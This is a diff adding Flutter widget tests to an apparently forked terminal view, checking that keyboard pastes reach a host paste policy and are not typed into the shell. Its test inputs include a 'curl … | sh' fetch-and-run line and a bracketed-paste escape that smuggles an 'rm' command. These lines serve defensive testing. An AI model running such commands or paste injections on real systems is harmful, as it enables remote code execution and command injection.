@@ -106,6 +106,94 @@ void main() {
     });
   });
 
+  // [seance fork] A soft keyboard commits its own clipboard (a clipboard
+  // chip, an iOS paste suggestion) as one text delta, which must reach the
+  // host's paste policy instead of being typed.
+  group('TerminalView.onKeyboardPaste', () {
+    Future<List<String>> pumpTyping(
+      WidgetTester tester,
+      Terminal terminal, {
+      ValueChanged<String>? onKeyboardPaste,
+    }) async {
+      final output = <String>[];
+      terminal.onOutput = output.add;
+      await tester.pumpWidget(MaterialApp(
+        home: Scaffold(
+          body: TerminalView(
+            terminal,
+            autofocus: true,
+            onKeyboardPaste: onKeyboardPaste,
+          ),
+        ),
+      ));
+      await tester.tap(find.byType(TerminalView));
+      await tester.pump(Duration(seconds: 1));
+      return output;
+    }
+
+    testWidgets('hands a multi-line insert to the host, not the shell',
+        (tester) async {
+      final pasted = <String>[];
+      final output = await pumpTyping(
+        tester,
+        Terminal(),
+        onKeyboardPaste: pasted.add,
+      );
+
+      binding.testTextInput.enterText('echo setup\ncurl https://x.test | sh\n');
+      await binding.idle();
+
+      expect(pasted, ['echo setup\ncurl https://x.test | sh\n']);
+      expect(output, isEmpty);
+    });
+
+    testWidgets('hands an insert carrying an escape to the host',
+        (tester) async {
+      final pasted = <String>[];
+      final output = await pumpTyping(
+        tester,
+        Terminal(),
+        onKeyboardPaste: pasted.add,
+      );
+
+      binding.testTextInput.enterText('ls\x1b[201~rm');
+      await binding.idle();
+
+      expect(pasted, ['ls\x1b[201~rm']);
+      expect(output, isEmpty);
+    });
+
+    testWidgets('types words, single keys and a lone Enter', (tester) async {
+      final pasted = <String>[];
+      final output = await pumpTyping(
+        tester,
+        Terminal(),
+        onKeyboardPaste: pasted.add,
+      );
+
+      // Glide typing, a suggestion or dictation commits a whole phrase.
+      binding.testTextInput.enterText('git status ');
+      await binding.idle();
+      binding.testTextInput.enterText('\n');
+      await binding.idle();
+
+      expect(output.join(), 'git status \n');
+      expect(pasted, isEmpty);
+    });
+
+    testWidgets('without a host, a keyboard paste is a bracketed paste',
+        (tester) async {
+      final terminal = Terminal();
+      final output = await pumpTyping(tester, terminal);
+      terminal.write('\x1b[?2004h');
+
+      binding.testTextInput.enterText('a\nb');
+      await binding.idle();
+
+      expect(output.join(), '\x1b[200~a\nb\x1b[201~');
+    });
+  });
+
   group('TerminalView.focusNode', () {
     testWidgets('is not listened when terminal is disposed', (tester) async {
       final terminal = Terminal();
